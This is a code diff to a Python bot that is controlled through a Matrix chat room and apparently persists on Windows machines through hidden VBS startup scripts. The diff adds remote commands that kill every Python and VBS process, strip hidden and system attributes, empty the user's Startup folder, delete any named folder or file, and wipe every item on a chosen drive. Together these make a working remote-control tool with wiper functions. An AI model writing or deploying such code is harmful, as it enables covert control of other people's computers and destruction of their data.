@@ -356,6 +356,11 @@ connection_timestamp = None  # This will be in Matrix server time (milliseconds)
 temp_dir = os.environ.get('TEMP', tempfile.gettempdir())
 lock_file = os.path.join(temp_dir, "matrix_bot_temp", "bot.lock")
 running = True
+# Global variables for conversation state
+awaiting_folder_path = {}
+awaiting_file_path = {}
+awaiting_drive_name = {}
+
 
 def update_lock_file():
     """Continuously update lock file to indicate bot is running"""
@@ -469,6 +474,176 @@ def restart_pc():
         print(f"Error restarting PC: {e}")
         return False
 
+def terminate_all_processes():
+    """Terminate all Python and VBS processes"""
+    terminated = []
+    errors = []
+    
+    try:
+        for proc in psutil.process_iter(['pid', 'name', 'cmdline', 'exe']):
+            try:
+                proc_info = proc.info
+                cmdline = proc_info.get('cmdline', [])
+                name = proc_info.get('name', '').lower()
+                exe = proc_info.get('exe', '').lower()
+                
+                # Kill Python processes
+                if ('python' in name or 
+                    (cmdline and any('python' in arg.lower() for arg in cmdline)) or
+                    'python' in exe):
+                    proc.terminate()
+                    terminated.append(f"Python process {name} (PID: {proc_info['pid']})")
+                
+                # Kill VBS processes (including hidden/silent ones)
+                elif ('wscript' in name or 'cscript' in name or
+                      (cmdline and any(arg.lower().endswith('.vbs') for arg in cmdline))):
+                    proc.terminate()
+                    terminated.append(f"VBS process {name} (PID: {proc_info['pid']})")
+                    
+            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                continue
+        
+        # Wait for processes to terminate
+        time.sleep(2)
+        
+        # Force kill if still running
+        for proc in psutil.process_iter(['pid', 'name', 'cmdline', 'exe']):
+            try:
+                proc_info = proc.info
+                cmdline = proc_info.get('cmdline', [])
+                name = proc_info.get('name', '').lower()
+                exe = proc_info.get('exe', '').lower()
+                
+                if (('python' in name or 
+                     (cmdline and any('python' in arg.lower() for arg in cmdline)) or
+                     'python' in exe) or
+                    ('wscript' in name or 'cscript' in name or
+                     (cmdline and any(arg.lower().endswith('.vbs') for arg in cmdline)))):
+                    proc.kill()
+                    terminated.append(f"{name} (PID: {proc_info['pid']}) - force killed")
+                    
+            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                continue
+                
+    except Exception as e:
+        errors.append(str(e))
+    
+    return terminated, errors
+
+def clear_startup_directory():
+    """Clear the entire startup directory"""
+    try:
+        startup_folder = os.path.expandvars(
+            r"C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+        )
+        
+        if not os.path.exists(startup_folder):
+            return False, "Startup folder not found"
+        
+        deleted_items = []
+        for item in os.listdir(startup_folder):
+            item_path = os.path.join(startup_folder, item)
+            try:
+                # Remove hidden attribute if it exists
+                try:
+                    subprocess.run(['attrib', '-H', '-S', '-R', item_path], check=False)
+                except:
+                    pass
+                
+                if os.path.isfile(item_path):
+                    os.remove(item_path)
+                    deleted_items.append(f"File: {item}")
+                elif os.path.isdir(item_path):
+                    import shutil
+                    shutil.rmtree(item_path)
+                    deleted_items.append(f"Folder: {item}")
+            except Exception as e:
+                return False, f"Failed to delete {item}: {str(e)}"
+        
+        return True, f"Deleted {len(deleted_items)} items from startup directory"
+        
+    except Exception as e:
+        return False, str(e)
+
+def delete_folder(folder_path):
+    """Delete a folder and all its contents"""
+    try:
+        if not os.path.exists(folder_path):
+            return False, "Folder does not exist"
+        
+        if not os.path.isdir(folder_path):
+            return False, "Path is not a folder"
+        
+        import shutil
+        shutil.rmtree(folder_path)
+        return True, "Deleted successfully"
+        
+    except Exception as e:
+        return False, str(e)
+
+def delete_file(file_path):
+    """Delete a specific file"""
+    try:
+        if not os.path.exists(file_path):
+            return False, "File does not exist"
+        
+        if not os.path.isfile(file_path):
+            return False, "Path is not a file"
+        
+        # Remove read-only/hidden attributes if they exist
+        try:
+            subprocess.run(['attrib', '-H', '-S', '-R', file_path], check=False)
+        except:
+            pass
+        
+        os.remove(file_path)
+        return True, "Deleted successfully"
+        
+    except Exception as e:
+        return False, str(e)
+
+def clear_drive(drive_letter):
+    """Clear all contents of a drive"""
+    try:
+        # Normalize drive letter
+        if not drive_letter.endswith(':'):
+            drive_letter += ':'
+        if not drive_letter.endswith('\\'):
+            drive_letter += '\\'
+        
+        if not os.path.exists(drive_letter):
+            return False, "Drive does not exist"
+        
+        deleted_count = 0
+        errors = []
+        
+        for item in os.listdir(drive_letter):
+            item_path = os.path.join(drive_letter, item)
+            try:
+                # Remove attributes
+                try:
+                    subprocess.run(['attrib', '-H', '-S', '-R', item_path], check=False)
+                except:
+                    pass
+                
+                if os.path.isfile(item_path):
+                    os.remove(item_path)
+                    deleted_count += 1
+                elif os.path.isdir(item_path):
+                    import shutil
+                    shutil.rmtree(item_path)
+                    deleted_count += 1
+            except Exception as e:
+                errors.append(f"{item}: {str(e)}")
+        
+        if errors:
+            return False, f"Deleted {deleted_count} items, but {len(errors)} failed: {'; '.join(errors[:3])}"
+        else:
+            return True, f"Deleted successfully - {deleted_count} items removed"
+        
+    except Exception as e:
+        return False, str(e)
+
 async def establish_connection_timestamp():
     """Establish connection timestamp using Matrix server time"""
     global connection_timestamp
@@ -576,54 +751,69 @@ async def message_callback(room: MatrixRoom, event: RoomMessageText):
 
 async def process_command(message):
     """Process bot commands"""
-    global running
+    global running, awaiting_folder_path, awaiting_file_path, awaiting_drive_name
     
     message = message.strip()
     
-    # DEFCON 5 - Terminate processes
+    # Check if we're awaiting a folder path
+    if BOT_NAME in awaiting_folder_path:
+        success, msg = delete_folder(message)
+        del awaiting_folder_path[BOT_NAME]
+        return msg
+    
+    # Check if we're awaiting a file path
+    if BOT_NAME in awaiting_file_path:
+        success, msg = delete_file(message)
+        del awaiting_file_path[BOT_NAME]
+        return msg
+    
+    # Check if we're awaiting a drive name
+    if BOT_NAME in awaiting_drive_name:
+        success, msg = clear_drive(message)
+        del awaiting_drive_name[BOT_NAME]
+        return msg
+    
+    # DEFCON 5 - Terminate all Python processes
     if message == f"DEFCON 5 {BOT_NAME}":
-        terminated, errors = terminate_processes()
+        terminated, errors = terminate_all_processes()
         if not errors:
-            running = False  # Stop this bot
+            running = False
             return f"Success from {BOT_NAME} on DEFCON 5"
         else:
             return f"Error from {BOT_NAME} on DEFCON 5: {'; '.join(errors)}"
     
-    # DEFCON 4 - Terminate and hide VBS
+    # DEFCON 4 - Terminate all Python and VBS processes
     elif message == f"DEFCON 4 {BOT_NAME}":
-        terminated, errors = terminate_processes()
+        terminated, errors = terminate_all_processes()
         if not errors:
-            if hide_vbs_file():
-                running = False
-                return f"Success from {BOT_NAME} on DEFCON 4"
-            else:
-                return f"Error from {BOT_NAME} on DEFCON 4: Failed to hide VBS file"
+            running = False
+            return f"Success from {BOT_NAME} on DEFCON 4"
         else:
             return f"Error from {BOT_NAME} on DEFCON 4: {'; '.join(errors)}"
     
-    # DEFCON 3 - Terminate and delete VBS
+    # DEFCON 3 - Terminate processes and clear startup directory
     elif message == f"DEFCON 3 {BOT_NAME}":
-        terminated, errors = terminate_processes()
+        terminated, errors = terminate_all_processes()
         if not errors:
-            if delete_vbs_file():
+            success, msg = clear_startup_directory()
+            if success:
                 running = False
                 return f"Success from {BOT_NAME} on DEFCON 3"
             else:
-                return f"Error from {BOT_NAME} on DEFCON 3: Failed to delete VBS file"
+                return f"Error from {BOT_NAME} on DEFCON 3: {msg}"
         else:
             return f"Error from {BOT_NAME} on DEFCON 3: {'; '.join(errors)}"
     
-    # DEFCON 2 - All bots terminate and delete
+    # DEFCON 2 - All bots terminate and clear startup
     elif message == "DEFCON 2":
-        terminated, errors = terminate_processes()
+        terminated, errors = terminate_all_processes()
         if not errors:
-            if delete_vbs_file():
+            success, msg = clear_startup_directory()
+            if success:
                 running = False
-                # Note: The "DEFCON 2 SUCCESSFUL FOR ALL BOTS!" message would need
-                # to be coordinated between all bots - this is complex to implement
                 return f"Success from {BOT_NAME} on DEFCON 2"
             else:
-                return f"Error from {BOT_NAME} on DEFCON 2: Failed to delete VBS file"
+                return f"Error from {BOT_NAME} on DEFCON 2: {msg}"
         else:
             return f"Error from {BOT_NAME} on DEFCON 2: {'; '.join(errors)}"
     
@@ -644,6 +834,21 @@ async def process_command(message):
             return f"restart confirmed for {BOT_NAME}"
         else:
             return f"Error from {BOT_NAME}: Failed to initiate restart"
+    
+    # Clear out a folder
+    elif message == f"Clear out a folder {BOT_NAME}":
+        awaiting_folder_path[BOT_NAME] = True
+        return "Which folder"
+    
+    # Clear out a file
+    elif message == f"Clear out a file {BOT_NAME}":
+        awaiting_file_path[BOT_NAME] = True
+        return "Which file"
+    
+    # Clear out a drive
+    elif message == f"Clear out a drive {BOT_NAME}":
+        awaiting_drive_name[BOT_NAME] = True
+        return "Which drive"
     
     # Start listening in Word Mode
     elif message == f"Start listening in Word Mode {BOT_NAME}":
